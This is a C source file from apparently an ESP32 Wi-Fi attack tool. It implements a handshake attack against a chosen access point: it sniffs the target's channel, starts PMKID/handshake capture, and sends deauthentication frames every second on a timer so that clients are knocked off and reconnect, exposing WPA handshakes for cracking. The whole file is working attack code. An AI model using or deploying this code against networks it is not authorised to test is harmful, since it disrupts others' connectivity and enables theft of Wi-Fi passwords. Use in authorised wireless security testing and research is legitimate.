#include "attack_handshake.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "attack.h"
#include "deauther.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"

static const char *TAG = "main:attack_handshake";
static esp_timer_handle_t deauth_timer_handle;
static const wifi_ap_record_t *ap_record = NULL;

static void send_deauth_frame(void* arg){
    deauther_send_deauth_frame(ap_record);
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    ap_record = attack_config->ap_record;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    // temporary call until specific fucntion for handshake is created
    frame_analyzer_pmkid_capture_start(ap_record->bssid);
    
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &send_deauth_frame
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000));
}

void attack_handshake_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    wifictl_sniffer_stop();
    frame_analyzer_pmkid_capture_stop();
    ap_record = NULL;
    ESP_LOGD(TAG, "Handshake attack stopped");
}